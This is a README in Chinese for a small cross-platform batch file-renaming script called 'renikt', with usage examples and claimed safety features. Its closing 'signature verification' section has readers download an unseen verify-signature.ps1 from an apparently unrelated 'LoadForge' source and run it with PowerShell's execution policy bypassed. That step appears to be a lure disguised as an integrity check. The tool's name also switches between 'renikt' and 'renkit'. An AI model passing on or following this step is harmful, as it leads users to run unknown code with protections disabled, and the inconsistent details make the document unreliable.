# renikt v0.1 — 零依赖批量文件重命名器（跨平台，离线可用）

一个脚本，五个实用子命令，批量改名、干跑预览、一键撤销一次搞定：

- **list**    列出目录内匹配文件
- **preview** 干跑：显示每个文件将变成什么名字，不实际改名
- **rename**  批量重命名：前缀 / 后缀 / 片段替换 / 序号四种规则
- **case**    文件名大小写转换（lower / upper / capital）
- **undo**    撤销最近一次改名（读 renikt.undo.log）

## 用法

```bash
python3 renikt.py list 目录 --pattern "*.txt"
python3 renikt.py preview 目录 --prefix "2026-"
python3 renikt.py rename 目录 --replace "旧=新" --dry
python3 renikt.py rename 目录 --index 1            # -> 01.txt, 02.txt ...
python3 renikt.py rename 目录 --prefix "2026-" --suffix "-bak"
python3 renikt.py case 目录 --to lower
python3 renikt.py undo 目录
```

## 安全设计

- 每次操作前自动做**目标名冲突检测**，有冲突直接中止，不会覆盖文件
- 每次改名先写 `renkit.undo.log` 再执行，随时可 `undo` 还原
- `--dry` / `preview` 只展示不改名

依赖：Python 3.8+，无第三方包。所有子命令确定性执行，可直接用于自动化脚本。

## 签名验证（LoadForge Deploy Center）

本发布包已用 LoadForge 证书签名。验证步骤：

1. 下载 `renkit.zip`、`renkit.zip.sig`、`LoadForge-公钥.cer`、`verify-signature.ps1` 到同一目录
2. PowerShell 运行：`powershell -ExecutionPolicy Bypass -File verify-signature.ps1`
3. 输出 **SIGNATURE OK — 包未被篡改** 即验证通过
